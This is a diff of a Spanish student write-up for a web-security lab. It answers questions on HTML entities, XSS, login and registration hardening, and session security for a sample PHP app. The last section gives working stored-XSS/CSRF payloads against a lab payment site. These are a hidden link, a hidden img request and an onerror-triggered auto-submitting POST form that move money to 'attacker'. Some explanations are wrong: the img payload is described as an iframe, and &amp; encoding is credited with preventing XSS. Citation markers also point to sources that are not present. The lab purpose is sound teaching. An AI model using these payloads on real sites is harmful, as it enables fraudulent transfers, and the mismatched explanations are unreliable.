@@ -76,11 +76,27 @@
 
 ### **B) Por qué dice `&amp;` cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GET dentro de código html si en realidad el link es sólo con "&" ?**
 
-    **(Explica detalladamente el uso de entidades HTML en links y su impacto en seguridad.)**
+    El símbolo `&` (ampersand) en un URL se utiliza en los parámetros de una consulta GET para separar las diferentes variables o parámetros. Por ejemplo:
 
-    Explicación:
+    ```txt
+    https://example.com/donacion?cantidad=50&nombre=Juan
+    ```
 
-    El carácter `&amp;` es la forma codificada del carácter & en HTML. Esto sucede porque en el código fuente de la página, el carácter & está correctamente escapado como `&amp;`. La razón para esto es prevenir errores en el análisis del HTML o posibles vulnerabilidades en el navegador.
+    En este caso, el `&` separa los parámetros `cantidad` y `nombre`.
+
+    Sin embargo, en HTML, el símbolo `&` tiene un significado especial porque es el inicio de una **entidad de caracteres**. Para representar este símbolo de manera literal en un documento HTML, se debe usar la entidad `&amp;`. Esto asegura que el navegador interprete correctamente el `&` como un carácter y no como el comienzo de una nueva entidad HTML. Así que en un código HTML, la URL con parámetros GET debería escribirse como:
+
+    ```txt
+    https://example.com/donacion?cantidad=50&amp;nombre=Juan
+    ```
+
+    **Impacto en seguridad y usabilidad:**
+
+    1. **Prevención de errores de interpretación**: Cuando se incluyen URLs dentro de un código HTML, si no se usan las entidades adecuadas, puede causar errores al interpretar el enlace. Por ejemplo, si un navegador encuentra `&` sin ser escapado como `&amp;`, puede interpretar incorrectamente el resto del URL o los parámetros. Esto puede resultar en problemas de carga o un comportamiento inesperado en la página web.
+
+    2. **Inyección de código malicioso (XSS)**: Si un enlace en HTML no escapa correctamente los caracteres especiales, un atacante podría inyectar código malicioso en los parámetros de la URL. Por ejemplo, si un formulario o enlace no valida correctamente los parámetros de una URL, un atacante podría usar el `&` para insertar código JavaScript dentro de los parámetros de la URL y ejecutar un ataque de **Cross-Site Scripting (XSS)**. En este caso, el uso de `&amp;` ayuda a prevenir la ejecución de código no deseado.
+
+    3. **Robustez en el uso de enlaces**: Al asegurarse de que los símbolos como `&` se codifiquen correctamente con entidades HTML (`&amp;`), se puede garantizar que los enlaces sean interpretados de manera coherente en diferentes navegadores y plataformas. Esto mejora la interoperabilidad y hace que la aplicación sea más confiable y segura.
 
 ### **C) Explicad cuál es el problema de `show\_comments.php`, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.**
 
@@ -117,7 +133,12 @@
 
 ### **D) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.**
 
-    ![FALTA]()
+    **Otras páginas afectadas:**  
+    - **`insert_player.php`**: Afectada por XSS almacenado si los datos de entrada (como el nombre del jugador) no se validan y se muestran sin sanitización en otras páginas.
+    - **`buscador.php`**: Afectada por XSS reflejado si el término de búsqueda no se valida y permite la ejecución de código malicioso cuando se muestra en los resultados.
+
+    **Cómo lo he descubierto:**  
+    He probado insertar un script malicioso (`<script>alert('XSS');</script>`) en los campos de entrada. Si el script se ejecuta al visualizar la página con los datos ingresados, la página es vulnerable a XSS.
 
 <br><br><br>
 
@@ -125,18 +146,18 @@
 
 ### **A) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de `register.php` tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.**
 
-    1. Línea 4-5: Se ha reemplazado el acceso directo a $_POST por filter_input() para sanitizar la entrada del usuario y trim() para eliminar espacios en blanco.
+    1. Se ha reemplazado el acceso directo a $_POST por filter_input() para sanitizar la entrada del usuario y trim() para eliminar espacios en blanco.
     ```php
     $username = trim(filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING));
     $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
     ```
 
-    2. Línea 7-9: Se ha añadido una verificación para asegurarse de que los campos no estén vacíos.
+    2. Se ha añadido una verificación para asegurarse de que los campos no estén vacíos.
     ```php
     if (!empty($username) && !empty($password)) {
     ```
 
-    3. Línea 10-13: Se ha reemplazado la inserción directa de SQL por una consulta preparada para prevenir inyecciones SQL.
+    3. Se ha reemplazado la inserción directa de SQL por una consulta preparada para prevenir inyecciones SQL.
     ```php
     $query = "INSERT INTO users (username, password) VALUES (:username, :password)";
     $stmt = $db->prepare($query);
@@ -144,7 +165,7 @@
     $stmt->bindParam(':password', $password, SQLITE3_TEXT);
     ```
 
-    4. Línea 15-21: Se ha añadido manejo de errores y redirección segura.
+    4. Se ha añadido manejo de errores y redirección segura.
     ```php
     if ($stmt->execute()) {
         header("Location: list_players.php");
@@ -154,37 +175,37 @@
     }
     ```
 
-    5. Línea 36-38: Se ha añadido un mensaje de error en caso de que ocurra algún problema durante el registro.
+    5. Se ha añadido un mensaje de error en caso de que ocurra algún problema durante el registro.
     ```php
     <?php if (isset($error)): ?>
         <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
     <?php endif; ?>
     ```
 
-    6. Línea 39: Se ha añadido htmlspecialchars() a la acción del formulario para prevenir XSS.
+    6. Se ha añadido htmlspecialchars() a la acción del formulario para prevenir XSS.
     ```php
     <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
     ```
 
-    7. Línea 40-43: Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
+    7. Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
     ```php
     <input type="text" id="username" name="username" required>
     <input type="password" id="password" name="password" required>
     ```
 
-    8. Línea 55: Se ha añadido un atributo alt a la imagen del logo para mejorar la accesibilidad.
+    8. Se ha añadido un atributo alt a la imagen del logo para mejorar la accesibilidad.
     ```php
     <img src="images/logo-iesra-cadiz-color-blanco.png" alt="Logo">
     ```
 
 ### **B) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta `private`**
 
-    1. Línea 4: Se ha añadido el uso de sesiones en lugar de cookies para manejar la autenticación de forma más segura.
+    1. Se ha añadido el uso de sesiones en lugar de cookies para manejar la autenticación de forma más segura.
         ```php
         session_start();
         ```
 
-    2. Líneas 11-14: Se ha reemplazado la consulta SQL directa por una consulta preparada para prevenir inyecciones SQL.
+    2. Se ha reemplazado la consulta SQL directa por una consulta preparada para prevenir inyecciones SQL.
     ```php
     $query = "SELECT userId, password FROM users WHERE username = :username";
     $stmt = $db->prepare($query);
@@ -192,7 +213,7 @@
     $result = $stmt->execute();
     ```
 
-    3. Línea 17-20: Se ha implementado la verificación segura de contraseñas usando password_verify() y se almacena el userId en la sesión.
+    3. Se ha implementado la verificación segura de contraseñas usando password_verify() y se almacena el userId en la sesión.
     ```php
     if (password_verify($password, $row['password'])) {
         $userId = $row['userId'];
@@ -201,12 +222,12 @@
     }
     ```
 
-    4. Línea 28: Se ha añadido sanitización de la entrada del usuario para el nombre de usuario.
+    4. Se ha añadido sanitización de la entrada del usuario para el nombre de usuario.
     ```php
     $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
     ```
 
-    5. Líneas 31-34: Se ha mejorado el manejo de la autenticación exitosa, usando sesiones y redireccionando de forma segura.
+    5. Se ha mejorado el manejo de la autenticación exitosa, usando sesiones y redireccionando de forma segura.
     ```php
     if (areUserAndPasswordValid($username, $password)) {
         $_SESSION['user'] = $username;
@@ -215,7 +236,7 @@
     }
     ```
 
-    6. Líneas 39-42: Se ha mejorado el proceso de cierre de sesión, destruyendo la sesión y redireccionando de forma segura.
+    6. Se ha mejorado el proceso de cierre de sesión, destruyendo la sesión y redireccionando de forma segura.
     ```php
     if (isset($_POST['Logout'])) {
         session_destroy();
@@ -224,17 +245,17 @@
     }
     ```
 
-    7. Línea 59: Se ha añadido escape de salida para prevenir XSS en los mensajes de error.
+    7. Se ha añadido escape de salida para prevenir XSS en los mensajes de error.
     ```php
     <?= htmlspecialchars($error) ?>
     ```
 
-    8. Línea 66: Se ha añadido escape de salida en la acción del formulario para prevenir XSS.
+    8. Se ha añadido escape de salida en la acción del formulario para prevenir XSS.
     ```php
     <form action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="post">
     ```
 
-    9. Líneas 67-70: Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
+    9. Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
     ```php
     <input type="text" id="username" name="username" required><br>
     <input type="password" id="password" name="password" required><br>
@@ -331,7 +352,73 @@
 
 ### **E) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.**
 
-    ![FALTA]()
+Basándonos en la información proporcionada, parece que hay varias áreas donde la seguridad de la sesión del usuario podría mejorarse. Aquí están los problemas identificados y las acciones recomendadas para implementar:
+
+**Problemas de seguridad**
+
+1. Uso de cookies para almacenar credenciales: El código actual almacena el nombre de usuario y la contraseña en cookies, lo cual es extremadamente inseguro[5].
+
+2. Falta de regeneración de ID de sesión: No se está utilizando session_regenerate_id() después de un inicio de sesión exitoso[1][4].
+
+3. Configuración de cookies de sesión: No se están configurando parámetros importantes de las cookies de sesión como HttpOnly y SameSite[1].
+
+4. Falta de validación adicional: No se está realizando una validación adicional del usuario más allá del ID de sesión[7].
+
+    **Acciones recomendadas**
+
+    1. Eliminar el almacenamiento de credenciales en cookies:
+    ```php
+    // Eliminar estas líneas
+    $_COOKIE['user'] = $_POST['username'];
+    $_COOKIE['password'] = $_POST['password'];
+    ```
+
+    2. Implementar regeneración de ID de sesión:
+    ```php
+    if (areUserAndPasswordValid($username, $password)) {
+        session_regenerate_id(true);
+        $_SESSION['user'] = $username;
+        // ... resto del código
+    }
+    ```
+
+    3. Configurar cookies de sesión de forma segura:
+    ```php
+    session_set_cookie_params([
+        'lifetime' => 0,
+        'path' => '/',
+        'domain' => '',
+        'secure' => true,
+        'httponly' => true,
+        'samesite' => 'Lax'
+    ]);
+    session_start();
+    ```
+
+    4. Añadir validación adicional:
+    ```php
+    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
+    
+    // En cada página que requiera autenticación
+    if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT'] || 
+        $_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
+        // Posible intento de suplantación, destruir la sesión
+        session_destroy();
+        header("Location: login.php");
+        exit();
+    }
+    ```
+
+    5. Habilitar el modo estricto de sesiones:
+    ```php
+    ini_set('session.use_strict_mode', 1);
+    ```
+
+    6. Forzar el uso de cookies para las sesiones:
+    ```php
+    ini_set('session.use_only_cookies', 1);
+    ```
 
 <br><br><br>
 
@@ -347,36 +434,22 @@
 
 ### **A) Editad un jugador para conseguir que, en el listado de jugadores `list\_players.php` aparezca, debajo del nombre de su equipo y antes de `show/add comments` un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.**
 
-    ![FALTA]()
+    En el campo `Team` dentro de la web `insert_player.php` añadimos el siguente codigo HTML para agregar un boton que nos lleve a la pagina web preparada.
+
+    Codigo a añadir:
+
+    <a href="http://web.pagos/donate.php?amount=100&receiver=attacker" style="text-decoration: none;">
+        <button>Profile</button>
+    </a>
 
 ### **B) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**
 
     Añadimos un codigo malicios en los comentarios de los jugadores
 
     ```html
-    <script>
-        var form = document.createElement('form');
-        form.method = 'GET';
-        form.action = 'http://web.pagos/donate.php';
-        
-        var amountField = document.createElement('input');
-        amountField.type = 'hidden';
-        amountField.name = 'amount';
-        amountField.value = '100';
-        
-        var receiverField = document.createElement('input');
-        receiverField.type = 'hidden';
-        receiverField.name = 'receiver';
-        receiverField.value = 'attacker';
-        
-        form.appendChild(amountField);
-        form.appendChild(receiverField);
-        
-        document.body.appendChild(form);
-        form.submit();
-    </script>
+    <img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
     ```
-    Este código crea un formulario oculto con los parámetros necesarios (amount y receiver) y lo envía automáticamente al servidor de donaciones cuando el comentario es cargado.
+    Este código crea un iframe invisible que carga silenciosamente la página de donación especificada cuando el comentario es mostrado, sin alterar la experiencia visual del usuario ni requerir ninguna interacción. El iframe, al tener dimensiones de cero y sin bordes, permanece completamente oculto en la página de comentarios.
 
 
 ### **C) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.**
@@ -391,4 +464,30 @@
 
 ### **D) Si web.pagos modifica la página `donate.php` para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.**
 
-    ![FALTA]()
+    Cambiar el método de GET a POST en donate.php no blindaría completamente la página contra ataques XSS. Aunque dificulta el ataque, aún es posible realizar un ataque equivalente utilizando JavaScript para enviar una solicitud POST. Aquí hay un ejemplo de cómo se podría realizar un ataque similar usando POST:
+
+    ```bash
+    <img src="x" onerror="
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'http://web.pagos/donate.php';
+    form.style.display = 'none';
+    
+    var amountInput = document.createElement('input');
+    amountInput.type = 'hidden';
+    amountInput.name = 'amount';
+    amountInput.value = '100';
+    form.appendChild(amountInput);
+    
+    var receiverInput = document.createElement('input');
+    receiverInput.type = 'hidden';
+    receiverInput.name = 'receiver';
+    receiverInput.value = 'attacker';
+    form.appendChild(receiverInput);
+    
+    document.body.appendChild(form);
+    form.submit();
+    " style="display:none;">
+    ```
+
+    Este código crea un formulario oculto con los parámetros "amount" y "receiver", y lo envía automáticamente cuando se carga el comentario, simulando una solicitud POST a la página de donación.
